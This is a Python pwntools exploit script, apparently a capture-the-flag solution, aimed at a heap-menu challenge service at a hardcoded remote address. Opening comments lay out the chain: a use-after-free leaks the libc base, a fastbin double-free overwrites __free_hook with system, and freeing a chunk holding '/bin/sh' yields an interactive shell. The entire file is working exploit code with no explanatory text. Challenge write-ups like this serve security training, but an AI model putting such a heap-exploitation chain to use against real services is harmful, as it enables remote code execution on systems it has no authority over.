# use after free to leak
# same use after free to make fastbin dup since it's libc 2.29 we can't double free tcache
# overwrite __free_hook with system
# free chunk with "/bin/sh" as data => shell \o/

from pwn import *
from time import sleep
period=0.1
def create_house(name,size,description):
	p.sendline("1")
	sleep(period)
	p.recv(8000)
	p.sendline(name)
	sleep(period)
	p.recv(8000)
	p.sendline(str(size))
	sleep(period)
	p.recv(8000)
	p.sendline(description)
	sleep(period)
	p.recv(8000)

def create_person(name,size,description):
	p.sendline("2")
	sleep(period)
	p.recv(8000)
	p.sendline(name)
	sleep(period)
	p.recv(8000)
	p.sendline(str(size))
	sleep(period)
	p.recv(8000)
	p.sendline(description)
	sleep(period)
	p.recv(8000)

def add_person_to_house(perid,houid):
	p.sendline("3")
	sleep(period)
	p.recv(8000)
	p.sendline(str(perid))
	sleep(period)
	p.recv(8000)
	p.sendline(str(houid))
	sleep(period)
	p.recv(8000)

def remove_person_from_house(houid,perid):
	p.sendline("4")
	sleep(period)
	p.recv(8000)
	p.sendline(str(houid))
	sleep(period)
	p.recv(8000)
	p.sendline(str(perid))
	sleep(period)
	p.recv(8000)

def view_person(houid,perid):
	p.sendline("6")
	sleep(period)
	p.recv(8000)
	p.sendline(str(houid))
	sleep(period)
	p.recv(8000)
	p.sendline(str(perid))
	sleep(period)
	p.recv(8000)

def party(houid):
	p.sendline("7")
	sleep(period)
	p.recv(8000)
	p.sendline(str(houid))
	sleep(period)
	p.recv(8000)
def get_libc_base():
	p.sendline("5")
	sleep(period)
	p.recv(8000)
	p.sendline("0")
	sleep(period)
	p.recvuntil(" details  ")
	data = p.recvline().strip()
	p.recv(8000)
	leak = u64(data.ljust(8,"\x00"))
	return leak - 0x1e4ca0 #0x1e4ca0 # 0x3ebca0
#env = {"LD_PRELOAD":"./libc.so.6"}
#p = process("./chall") #,env=env)
p = remote("35.245.143.0",5555)
p.recv(8000)
create_house("aa",12,"bb")
print "creating persons..."
for i in range(9):
	print i
	create_person(chr(i+65)*4,0x100,chr(i+65)*4)
print "adding them to house..."
for i in range(9):
	add_person_to_house(i,0)
print "removing some to fill tcache..."
for i in range(7):
	remove_person_from_house(0,i)
print "final step to leak..."
view_person(0,7)
remove_person_from_house(0,10)
print "leaking..."
libc_base = get_libc_base()
print "libc_base: ",hex(libc_base)
print "second stage"
create_house("aa",12,"bb")
for i in range(10):
	print i
	create_person(chr(i+65)*4,0x60,chr(i+65)*4)
for i in range(10):
	add_person_to_house(i,1)
for i in range(8):
	remove_person_from_house(1,i)
malloc_hook = libc_base + 0x00000000003ebc30
free_hook = libc_base + 0x00000000001e75a8
system = libc_base + 0x0000000000052fd0
to_write = malloc_hook - 0x23
view_person(1,8)
remove_person_from_house(1,10)
remove_person_from_house(1,9)
party(1)
sleep(3)
p.recv(8000)
p.recv(8000)
create_person("aa",0x60,"/bin/sh\x00")
for i in range(6):
	create_person("a",0x60,"b")
create_person("",0x60,p64(free_hook))
create_person("",0x60,"b")
create_person("",0x60,"b")
#p.interactive()
create_person("",0x60,p64(system))
add_person_to_house(0,1)
p.sendline("4")
sleep(period)
p.sendline("1")
sleep(period)
p.sendline("0")
sleep(period)
p.interactive()
